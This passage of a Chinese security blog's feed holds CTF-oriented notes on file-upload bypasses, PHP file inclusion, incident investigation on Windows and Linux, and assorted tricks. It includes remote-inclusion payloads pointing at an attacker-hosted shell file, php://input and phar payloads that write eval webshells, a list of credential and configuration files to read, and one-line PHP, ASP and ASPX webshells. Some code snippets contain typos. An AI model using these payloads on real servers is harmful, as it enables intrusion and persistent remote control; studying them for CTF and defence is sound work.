class="attr">auto_append_file</span>=php://input</span><br></pre></td></tr></table></figure><ul><li>远程文件包含</li></ul><p>同日志包含, 这个也就是改改木马; 如果点也被过滤, 可以用长数字ip: <a href="https://www.bejson.com/convert/ip2int/">转换网址</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;http://数字IP/shell&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="条件竞争"><a class="header-anchor" href="#条件竞争">¶</a>条件竞争</h3><blockquote><p>绕过原理: 删除之前访问未删除的文件,生成真正使用的木马</p></blockquote><p>上传上去的文件马上就被删除了, 假如上传目录可以被访问/包含, 那就可以用条件竞争; 比较推荐使用脚本语言写脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">foprn</span>(<span class="string">&#x27;../shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="图片二次渲染"><a class="header-anchor" href="#图片二次渲染">¶</a>图片二次渲染</h3><p><a href="https://blog.csdn.net/2301_79299101/article/details/134295885">文件上传之图片二次渲染上传</a></p><p>直接看ctfshow web164</p><h3 id="文件下载"><a class="header-anchor" href="#文件下载">¶</a>文件下载</h3><p>有些网站下载的方法是进行文件包含(download?file=…), 可以先上传一个文件末尾增加了一句话的木马文件, 抓下载包就可以执行命令了</p><h3 id="极端情况"><a class="header-anchor" href="#极端情况">¶</a>极端情况</h3><p>如果真没有办法上传, 但是可以写新文件或更改现有页面(网站后台), 试试以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FTLES</span>[ <span class="string">&quot;file&quot;</span> ] [ <span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;错误:&quot;</span> . <span class="variable">$_FILES</span>[ <span class="string">&quot;file&quot;</span> ][ <span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="comment">//判断是否有错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;上传文件名;”. <span class="subst">$_FILES</span>[ &quot;</span>file<span class="string">&quot; ][&quot;</span> name <span class="string">&quot; ] . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">echo“文件类型:“ . S_FILES[ &quot;</span>file<span class="string">&quot; ] [ &quot;</span>type<span class="string">&quot;] . “&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件大小:”. (<span class="subst">$_FILES</span>[ &quot;</span>file<span class="string">&quot; ] [ &quot;</span>size<span class="string">&quot; ] / 1024) . &quot;</span> kB&lt;br&gt;<span class="string">&quot;;//输出一些对应的信息</span></span><br><span class="line"><span class="string">echo &quot;</span>文件临时存储的位置:”. <span class="variable">$_FILES</span>[ <span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name &quot;</span> ];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>( <span class="string">&quot; upload:&quot;</span> . <span class="variable">$_FILES</span>[ <span class="string">&quot;filc&quot;</span> ] [ <span class="string">&quot; name&quot;</span> ] ) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span> ][ <span class="string">&quot;name&quot;</span> ] .”文件已经存在。“;<span class="comment">//判断是否有同名文件</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果 upload目求不存在该文件则将文件上传到upload目录下</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&quot;file&#x27; ] [ &quot;</span> tmp_name<span class="string">&quot; ]，&quot;</span>upload/<span class="string">&quot; . <span class="subst">$_FILES</span>[ &quot;</span> file<span class="string">&quot; ][ &quot;</span> name<span class="string">&quot; ) );</span></span><br><span class="line"><span class="string">echo &quot;</span>文件存储在:” . <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[ <span class="string">&quot;file&quot;</span> ] [ <span class="string">&quot;name &quot;</span> ] ;</span><br><span class="line">&#125;//输出位置</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span>//inpuut type类型必须为file</span><br><span class="line">&lt; / head&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php &quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span> &gt;</span>文件名: &lt; /label&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">o</span>&lt;<span class="attr">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>= <span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">&lt; /form&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/article/file-inclusion/"/>
      <url>/article/file-inclusion/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>文件包含</h1><h2 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h2><p>传入的文件名没有经过合理的校验,从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入。</p><h2 id="危险函数-漏洞来源"><a class="header-anchor" href="#危险函数-漏洞来源">¶</a>危险函数(漏洞来源)</h2><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ul><h2 id="包含分类"><a class="header-anchor" href="#包含分类">¶</a>包含分类</h2><p>allow_url_include = onallow_url_fopen = on</p><blockquote><p>php5.2后allow_url_include默认为offallow_url_include开启就可能有远程文件包含</p></blockquote><h3 id="本地文件包含-LFI"><a class="header-anchor" href="#本地文件包含-LFI">¶</a>本地文件包含(LFI)</h3><h4 id="直接包含有flag的文件"><a class="header-anchor" href="#直接包含有flag的文件">¶</a>直接包含有flag的文件</h4><p>原url：<code>http://www.example.com/demo.php</code>在url后加上<code>?file=flag.php%00 </code>代码相当于<code>include '/home/www/flag.php%00.php' </code>,而%00是截断符，后面的.php被截断</p><h4 id="php伪协议"><a class="header-anchor" href="#php伪协议">¶</a>php伪协议</h4><p><code>file://</code>访问本地文件系统用法：file://文件绝对路径和文件名</p><p>php.ini里两个配置是否打开都可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./index.php?file=file://D:/phpstudy/www/flag.txt</span><br><span class="line">./index.php?file=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><code>php://filter</code>读取网页源代码用法：读取网页源代码条件：同file://</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// url后出现?file=的时候就可以尝试读取源代码, 但是假如我们并没有绝对路径, 则无法使用</span><br><span class="line">读取index的内容，并将内容进行base64编码并且输出</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line"></span><br><span class="line">resource - 可以指定要筛选的数据流</span><br><span class="line">read - 可以设定过滤器名称</span><br></pre></td></tr></table></figure><blockquote><p>假如没有进行base64编码就会被当成php执行</p></blockquote><p><code>php://input</code>将post请求中的数据作为php代码执行条件：<code>allow_url_include=on</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include/index.php?page=php://input</span><br><span class="line">// 然后POST发送木马或其他东西</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">&lt;?php fputs(fopen(&quot;shell&quot;,&quot;w&quot;),&quot;&lt;?php @eval(\$_POST[&#x27;a&#x27;])?&gt;&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><code>data://</code>向服务器输入数据让服务器执行需要<code>allow_url_fopen</code>,<code>allow_url_include</code>均为on</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">  </span><br><span class="line">text/plain，表示的是文本</span><br><span class="line">text/plain;base64, 若纯文本没用可用base64编码</span><br></pre></td></tr></table></figure><p><code>dict://</code>一般都出现在ssrf协议中，用来探测端口的指纹信息。同时也可以用它来代替gopher协议进行ssrf攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探测端口指纹</span><br><span class="line">192.168.0.0/?url=dict://192.168.0.0:6379</span><br><span class="line">//以上为探测6379（redis）端口的开发</span><br><span class="line">  </span><br><span class="line">反弹shell</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p><code>gopher://</code>协议经常用来打内网的各种应用mysql redis等。一般要用一些工具来进行构造payload 如gopherus等</p><p><code>zip://</code>访问服务器中的压缩包zip://协议可以用来访问服务器中的压缩包，无论压缩包里面的文件是什么类型的都可以执行</p><p><code>phar://</code>它也可以访问zip包，访问的格式与zip的不同</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?</span><br><span class="line">file=phar:///phpinfo.zip/phpinfo.txt</span><br><span class="line">#这里用/隔开了子文件</span><br><span class="line">  </span><br><span class="line">写入php代码获取webshell查看flag</span><br><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;&#x27;)?&gt;</span><br><span class="line">使用post方法，蚁剑等连接即可</span><br></pre></td></tr></table></figure><h3 id="远程文件包含-RFI"><a class="header-anchor" href="#远程文件包含-RFI">¶</a>远程文件包含(RFI)</h3><p>第三方服务器上可运行的PHP木马，拿到webshell查看flag。php.ini两个都是开启状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./demo.php?param=http://www.xx.com/attacker/PHPshell.txt</span><br><span class="line"></span><br><span class="line">txt内容为一句话木马, 连接即可</span><br></pre></td></tr></table></figure><h2 id="利用"><a class="header-anchor" href="#利用">¶</a>利用</h2><h3 id="读取源代码-敏感文件"><a class="header-anchor" href="#读取源代码-敏感文件">¶</a>读取源代码/敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows:</span><br><span class="line">C:\windows-version.txt// 系统敏感信息</span><br><span class="line">C:\boot.ini// 系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml// IIS配置文件</span><br><span class="line">C: \windows\repair\sam// windows初次安装密码</span><br><span class="line">C:\program Files\mysql\my.ini// MySQL配置信息</span><br><span class="line">C:\program Files\mysql\data\mysql\user.MYD// MySQL root</span><br><span class="line">C: \windows\php.ini// PHP配置信息</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/passwd//linux用户信息</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf//apache2配置文件</span><br><span class="line">/usr/local/app/php5/lib/php.ini//php配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf//apache配置文件</span><br><span class="line">/etc/my.cnf//Mysql配置文件</span><br></pre></td></tr></table></figure><h3 id="Apache日志文件包含"><a class="header-anchor" href="#Apache日志文件包含">¶</a>Apache日志文件包含</h3><p>用户发起请求,请求会写入access.log, 发生错误会写入error.log</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows+Apache:</span><br><span class="line">XAMPP:phpStudy\Apache\logs\access.log</span><br><span class="line">phpxampp\apache\logs\access.log</span><br><span class="line"></span><br><span class="line">Linux+Apache:</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br></pre></td></tr></table></figure><h3 id="IIS日志文件"><a class="header-anchor" href="#IIS日志文件">¶</a>IIS日志文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows+IIS6</span><br><span class="line">C:\Windows\system32\Logfiles</span><br><span class="line"></span><br><span class="line">Windows+IIS7</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure><h3 id="Nginx日志文件"><a class="header-anchor" href="#Nginx日志文件">¶</a>Nginx日志文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装目录相关:</span><br><span class="line">若安装目录/usr/local/nginx, 则日志在/usr/local/nginx/logs里</span><br><span class="line"></span><br><span class="line">也可以通过 nginx.conf 获取日志</span><br><span class="line">/opt/nginx/logs/access.log</span><br></pre></td></tr></table></figure><h3 id="SSH日志文件"><a class="header-anchor" href="#SSH日志文件">¶</a>SSH日志文件</h3><p>用户名写成木马, 就可以了</p><h3 id="session文件包含"><a class="header-anchor" href="#session文件包含">¶</a>session文件包含</h3><p>路径可以通过phpinfo获取,是<code>session.save_path</code>参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见路径:</span><br><span class="line">/var/lib/php/sess_[PHPSESSID]</span><br><span class="line">/tmp/sess_[PHPSESSID]</span><br></pre></td></tr></table></figure><p>构造恶意session,然后获取session文件名,连接即可</p><blockquote><p>基本上和php绑定了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入侵排查</title>
      <link href="/article/intrusion-investigation/"/>
      <url>/article/intrusion-investigation/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Windows</h1><h2 id="账号排查"><a class="header-anchor" href="#账号排查">¶</a>账号排查</h2><p>正常用户查看:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>隐藏用户查看: 控制面板, lusrmgr.msc, 用户组可查看( 在用户名后面有一个美元$符号 )</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>影子用户查看: 只有注册表中能看到</p><p>三种查看方式:<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240331230739692.png" alt="image-20240331230739692"></p><h2 id="注册表排查"><a class="header-anchor" href="#注册表排查">¶</a>注册表排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win+R , regedit</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names 下的文件夹名就是用户</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\MicrosoftWindows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>SAM默认是没有下拉列表的, 右键选择权限, 选择管理员账户, F5刷新</p><blockquote><p>自带的账户:</p><ul><li>Administrator (管理员) : 这是具有完全控制和访问权限的管理员账户, 默认禁用</li><li>DefaultAccount (默认账户) : 这是Win10的一个预配置账户，用于应用程序容器和系统组件的身份验证。它主要用于提供安全性和隔离性</li><li>Guest (访客) : 提供受限制的用户环境，允许临时用户使用计算机但不能进行敏感操作或更改系统设置。默认禁用</li><li>WDAGUtilityAccount : 这是WDAG(防火墙)实用程序账户。WDAG 是一种安全功能，可在Microsoft Edge浏览器中隔离和保护来自不受信任来源的网站和文件</li></ul></blockquote><h2 id="网络信息排查"><a class="header-anchor" href="#网络信息排查">¶</a>网络信息排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat - -ano// 非管理员运行, 主要查看谁连接我</span><br><span class="line">netstat -anob// 管理员权限运行, 可以看到某个进程具体是由哪个程序进行运行</span><br></pre></td></tr></table></figure><h2 id="进程排查"><a class="header-anchor" href="#进程排查">¶</a>进程排查</h2><p>任务管理器或者火绒剑都可以排查, 如果木马非免杀, 那么装上火绒木马就没咯</p><h2 id="最近修改-打开的文件"><a class="header-anchor" href="#最近修改-打开的文件">¶</a>最近修改/打开的文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%UserProfile%\Recent// win+R</span><br></pre></td></tr></table></figure><h2 id="日志排查"><a class="header-anchor" href="#日志排查">¶</a>日志排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统日志</span><br><span class="line">%SystemRoot%\System32\Winevt\Logs\System.evtx</span><br><span class="line">应用程序日志</span><br><span class="line">%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br><span class="line">安全日志</span><br><span class="line">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br><span class="line"></span><br><span class="line">win+R或者事件查看器中打开</span><br></pre></td></tr></table></figure><p>查看系统账号操作:</p><p>查看<strong>安全日志</strong>,右侧选择<strong>筛选当前日志</strong></p><table><thead><tr><th>事件ID</th><th>说明</th></tr></thead><tbody><tr><td>4624</td><td>登录成功</td></tr><tr><td>4625</td><td>登录失败</td></tr><tr><td>4634</td><td>注销成功</td></tr><tr><td>4647</td><td>用户启动的注销</td></tr><tr><td>4672</td><td>使用超级用户进行登录</td></tr><tr><td>4720</td><td>创建用户</td></tr></tbody></table><p>例: 事件ID: 4625，事件数175904 时, 可能是暴力破解</p><h1>Liuux</h1><h2 id="历史命令排查"><a class="header-anchor" href="#历史命令排查">¶</a>历史命令排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history // 查看历史命令</span><br></pre></td></tr></table></figure><h2 id="账号权限排查"><a class="header-anchor" href="#账号权限排查">¶</a>账号权限排查</h2><p>看看其他帐号是否存在sudo权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><p>有一个<code>%wheel</code></p><h2 id="进程排查-v2"><a class="header-anchor" href="#进程排查-v2">¶</a>进程排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps// 命令列出系统中当前运行进程</span><br><span class="line">top// 显示系统中各个进程的资源占用状况</span><br></pre></td></tr></table></figure><h2 id="计划任务排查"><a class="header-anchor" href="#计划任务排查">¶</a>计划任务排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/crontab</span><br><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="日志排查-v2"><a class="header-anchor" href="#日志排查-v2">¶</a>日志排查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">整体日志:cat /var/log/message</span><br><span class="line">用户登录注销日志/var/log/wtmp:last</span><br><span class="line">登录日志/var/log/lastlog:lastlog</span><br><span class="line">登录失败日志/var/log/btmp:lastb</span><br><span class="line">当前用户/var/log/utmp:w,who,users</span><br><span class="line">定时任务日志:cat /var/log/cron</span><br><span class="line">系统应用登录日志:cat /var/log/secure</span><br><span class="line">软件安装日志:cat /var/log/yum.log</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Windows </tag>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小寄巧</title>
      <link href="/article/4urpr1se/"/>
      <url>/article/4urpr1se/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>JavaScript:</h1><h3 id="js的三种弹出提示框"><a class="header-anchor" href="#js的三种弹出提示框">¶</a>js的三种弹出提示框:</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;flag&quot;</span>);<span class="comment">// 会弹出警告框和一个按钮</span></span><br><span class="line"><span class="title function_">confirm</span>(<span class="string">&quot;flag&quot;</span>);<span class="comment">// 显示一个“确定”和“取消”按钮的对话框, 后可接上判断语句</span></span><br><span class="line"><span class="title function_">prompt</span>(<span class="string">&quot;flag&quot;</span>);<span class="comment">// 显示一个对话框, 可以输入文本</span></span><br><span class="line"><span class="title function_">fillText</span>(<span class="string">&#x27;flag&#x27;</span>,x,y);<span class="comment">// 指定地点绘制文本</span></span><br></pre></td></tr></table></figure><p>一般来说前端程序是js就可以先尝试这些来找到flag, 找到了看不懂或者里面堆着一大堆就尝试一下复制到控制台运行一下</p><h3 id="js前端过滤"><a class="header-anchor" href="#js前端过滤">¶</a>js前端过滤</h3><p>你可以在网页禁用js来解除前端过滤, 不仅如此, 假如是js前端鉴权, 你可以随意越权访问</p><h1>kali命令 查找子域名和ip地址</h1><ul><li>dnsenum</li><li>whois</li><li>Dig</li><li>nslookup <a href="http://www.baidu.com">www.baidu.com</a></li></ul><h1>DNS更新记录解析</h1><h1>修改 ping 时的 ttl 值</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh interface ipv4 **set** global defaultcurhoplimit=64</span><br></pre></td></tr></table></figure><p>#　Google hack</p><ul><li><p>inurl:pdf 计算机 site:baidu.com指定网站内包含计算机字符串的pdf</p></li><li><p>filetype:xls “username | password”查找xls文件要包含usernam或password</p></li><li><p>site:mit.edu filetype:pdf net security指定网站查找与&quot;网络安全&quot;相关的 PDF 文件</p></li></ul><h1>CDN</h1><p>无法使用主动扫描<a href="https://ping.chinaz.com">https://ping.chinaz.com</a>可以查看baidu各地的CDN</p><h1>信息收集软件, 开源情报收集和取证</h1><ul><li>Maltego</li><li>sn0int</li><li>ZoomEye</li></ul><h1>vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim编辑ReadOnly不能保存? 退出编辑模式后输入:w !sudo tee %进行保存，之后再使用:q!退出即可</span><br></pre></td></tr></table></figure><h1>openssl</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1</span><br></pre></td></tr></table></figure><h1>一句话木马</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php一句话</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;2333&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// js一句话</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;2333&quot;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 短标签</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关键词绕过php</span></span><br><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;absbsbebrbt&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// asp一句话</span></span><br><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">requset</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// aspx一句话</span></span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure><h1>md5:</h1><h3 id="加密后变成sql注入的"><a class="header-anchor" href="#加密后变成sql注入的">¶</a>加密后变成sql注入的:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure><h3 id="碰撞的"><a class="header-anchor" href="#碰撞的">¶</a>碰撞的:</h3><p>我还是更推荐 fastcoll 工具直接生成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><h1>TTL判断系统类型</h1><table><thead><tr><th>系统类型</th><th>ping-TTL返回值</th></tr></thead><tbody><tr><td>windows 2000</td><td>128</td></tr><tr><td>linux</td><td>64</td></tr><tr><td>windows NT</td><td>107</td></tr><tr><td>windows 9x</td><td>128 / 107</td></tr><tr><td>Solaris</td><td>252</td></tr><tr><td>IRIX</td><td>240</td></tr><tr><td>AIR</td><td>247</td></tr></tbody></table><h1>OWASP</h1><p>开放式Web应用程序安全项目</p><p>某种意义上也是为渗透提供了攻击思路</p><h1>网页禁止右键解除</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> doc = <span class="variable language_">document</span>,</span><br><span class="line">    bd = doc.<span class="property">body</span>;</span><br><span class="line">    bd.<span class="property">onselectstart</span> = bd.<span class="property">oncopy</span> = bd.<span class="property">onpaste</span> = bd.<span class="property">onkeydown</span> = bd.<span class="property">oncontextmenu</span> = bd.<span class="property">onmousemove</span> = bd.<span class="property">onselectstart</span> = bd.<span class="property">ondragstart</span> = doc.<span class="property">onselectstart</span> = doc.<span class="property">oncopy</span> = doc.<span class="property">onpaste</span> = doc.<span class="property">onkeydown</span> = doc.<span class="property">oncontextmenu</span> = <span class="literal">null</span>;</span><br><span class="line">    doc.<span class="property">onselectstart</span> = doc.<span class="property">oncontextmenu</span> = doc.<span class="property">onmousedown</span> = doc.<span class="property">onkeydown</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">with</span> (doc.<span class="property">wrappedJSObject</span> || doc) &#123;</span><br><span class="line">        onmouseup = <span class="literal">null</span>;</span><br><span class="line">        onmousedown = <span class="literal">null</span>;</span><br><span class="line">        oncontextmenu = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> allElements = doc.<span class="title function_">getElementsByTagName</span>(<span 